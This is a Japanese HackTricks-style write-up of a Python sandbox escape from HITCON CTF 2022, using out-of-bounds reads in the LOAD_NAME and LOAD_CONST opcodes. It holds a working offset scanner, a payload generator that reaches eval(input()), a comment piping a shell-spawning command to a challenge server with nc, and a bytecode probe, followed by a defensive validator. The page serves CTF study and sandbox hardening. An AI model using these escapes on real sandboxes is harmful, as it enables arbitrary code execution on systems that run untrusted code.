# LOAD_NAME / LOAD_CONST opcode OOB Read

このページでは、Splitline による HITCON CTF 2022「V O I D」の元の writeup と exploit chain を応用しています。<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

`LOAD_NAME` または `LOAD_CONST` の operand は、意図的に短縮された `co_names` または `co_consts` tuple の範囲外を読み取れます。この challenge では、近くのエントリに `__getattribute__` などの有用な attribute が含まれるまで、到達不能なダミー name が使用されます。<sup>[[1]](#references)</sup>

残りの payload では、復元した name を再利用して sandbox escape を構築します。<sup>[[1]](#references)</sup>

### Overview <a href="#overview-1" id="overview-1"></a>

challenge wrapper は短く、評価する前に 1 つの expression を compile します。<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
入力は Python code object にコンパイルされ、その後 wrapper は `eval` を呼び出す前に、`co_consts` と `co_names` を空の tuple に置き換えます。<sup>[[1]](#references)[[5]](#references)</sup>

これらの table のいずれかに対して index を指定する生成済みの instruction は、build によっては interpreter をクラッシュさせたり、隣接する object pointer を expose したりする可能性があります。<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault はどのように発生するのでしょうか？

`[a, b, c]` のような list expression の場合、compiler は連続した operand を持つ `LOAD_NAME` instructions を生成します。<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
`co_names` が `()` に置き換えられても、bytecode には依然として `LOAD_NAME 2` が含まれます。そのため、チェックされていない tuple アクセスにより、`IndexError` を発生させる代わりに tuple の外部にあるポインタを取得できます。<sup>[[1]](#references)[[3]](#references)</sup>

ここでの中核となる primitive は `LOAD_NAME` と `LOAD_CONST` です。これらの整数オペランドは、それぞれ `co_names` と `co_consts` のエントリを選択します。<sup>[[1]](#references)[[2]](#references)</sup>

CPython の dispatch では、`LOAD_CONST` が選択された tuple エントリを取得して push します。release build では、チェックされていない tuple accessor が使用されます。<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
対象の interpreter で `LOAD_NAME` のオペランドを増加させながら probe し、有用なエントリを特定します。Splitline は challenge 環境で 700 を超える位置に有用な offset があることを確認しましたが、layout は build ごとに異なります。debugger を使うと、周辺メモリを調査できます。<sup>[[1]](#references)</sup>

### Exploit の生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

offset から有用な name が得られたら、到達不能な式に範囲外の lookup を配置し、到達可能な attribute access から同じ `co_names` の slot を参照します。<sup>[[1]](#references)</sup>

たとえば offset 5 から `__getattribute__` が得られる場合は、その name を slot 5 に保持し、false branch で有用な lookup を実行します。<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> 復元されたテキストは `__getattribute__` である必要はありません。payload の役割を果たす任意の identifier がその slot を占有できます。<sup>[[1]](#references)</sup>

コンパイラは、disassembly が示すように、同じ name が繰り返し現れる場合に `co_names` の slot を再利用します。<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
`LOAD_ATTR` も `co_names` を通じて名前を解決するため、到達可能な分岐ではそのスロットを再利用できます。新しい CPython バージョンにおける packed operands については、以下のバージョンノートで説明しています。<sup>[[1]](#references)[[2]](#references)</sup>

小さな非負整数は、constants を使わずに boolean expressions から合成できます。<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

元の exploit は、challenge の length limit 内に収めるため、constants ではなく names を使用していました。<sup>[[1]](#references)</sup>

この helper は、空の `co_names` tuple を持つ code object を構築することで、候補となる name offsets をスキャンします。<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
以下の generator は、復元された offset を名前に対応付け、ソースレベルの payload を生成します。<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
大まかには、生成された payload は関数の globals を取得し、`builtins` を復元して、`eval(input())` を呼び出します。<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Version notes and affected opcodes (Python 3.11–3.13)

- CPython 3.11–3.13 では、命令は依然として整数オペランドを使用して code object の定数テーブルおよび名前テーブルをインデックス参照します。いずれかの tuple が参照されたインデックスより短い場合、チェックされていないアクセスによって隣接する object pointer が読み取られ、crash したり、その object pointer に対して処理を実行したりする可能性があります。正確な挙動は interpreter build によって異なります。<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` および (3.12+) `RETURN_CONST consti` は `co_consts[consti]` を読み取ります。<sup>[[2]](#references)</sup>
- 直接 name-table を使用するものには、`LOAD_NAME`、`STORE_NAME`、`DELETE_NAME`、`STORE_GLOBAL`、`DELETE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`STORE_ATTR`、`DELETE_ATTR`、および (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` があります。<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` および `LOAD_ATTR namei` は `co_names[namei >> 1]` を使用します。下位ビットは、documented な NULL/method behavior を制御します。(3.12+) `LOAD_SUPER_ATTR namei` は `co_names[namei >> 2]` を使用し、下位ビットに2つの flag を格納します。<sup>[[2]](#references)</sup>
- Python 3.11+ では、命令間に hidden な `CACHE` entry を追加する adaptive/inline cache が導入されました。handcrafted bytecode で `co_code` を構築する場合は、これらの entry を考慮する必要があります。<sup>[[2]](#references)</sup>

実際的な意味として、bytecode の layout と復元された offset は release および build 固有です。これに依存する前に、対象の CPython version に対して technique と生成した payload をテストしてください。<sup>[[2]](#references)</sup>

### Quick scanner for useful OOB indexes (3.11+/3.12+ compatible)

high-level source ではなく bytecode から直接興味深い object を probe したい場合は、最小限の code object を生成して index を brute-force できます。以下の helper は、対象 interpreter の `dis` metadata に従って inline cache を挿入します。<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
注意
- 代わりに names を probe するには、`LOAD_CONST` を `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` に置き換え、対象 opcode に合わせて stack の使用方法と packed operand を調整します。<sup>[[2]](#references)</sup>
- 必要に応じて `EXTENDED_ARG` または `arg` の複数バイトを使用して、255 より大きい index に到達します。この helper は operand の下位バイトのみを出力するため、より大きな index には raw byte の構築または複数の load が必要です。<sup>[[2]](#references)</sup>

### 最小限の bytecode-only RCE pattern（co_consts OOB → builtins → eval/input）

builtins module に解決される `co_consts` index を特定したら、stack を操作することで `co_names` なしに `eval(input())` を再構築できます。公式の B01lers CTF 2024 `awpcode` の資料では、この同じ OOB-read pattern が解説されています。<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
このスタックのみを使用するアプローチは、`co_code` を直接制御できる一方で `co_consts=()` と `co_names=()` を強制される challenge で有用です。ソースレベルの tricks を避け、bytecode のスタック操作と tuple builders を使って payload を小さく保てます。<sup>[[4]](#references)</sup>

### sandbox の defensive checks と mitigation

untrusted code を compile または evaluate する Python sandbox を作成する場合、bytecode で使用される tuple index の bounds-check を CPython に依存しないでください。実行前に code object を validate してください。<sup>[[2]](#references)[[3]](#references)</sup>

実用的な validator（`co_consts`/`co_names` への OOB access を reject します）。<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
追加の緩和策のアイデア
- 信頼できない入力に対する任意の `CodeType.replace(...)` を許可しないか、結果の code object に対して厳格な構造チェックを追加する。
- CPython のセマンティクスに依存するのではなく、OS-level sandboxing（seccomp、job objects、containers）を使用して、信頼できない code を別のプロセスで実行することを検討する。

## References

- [1] [Splitline の HITCON CTF 2022 writeup「V O I D」（この technique と high-level exploit chain の起源）](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis` documentation（bytecode indices、packed name operands、inline caches）](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros（`GETITEM`）](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup（CygnusX）](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
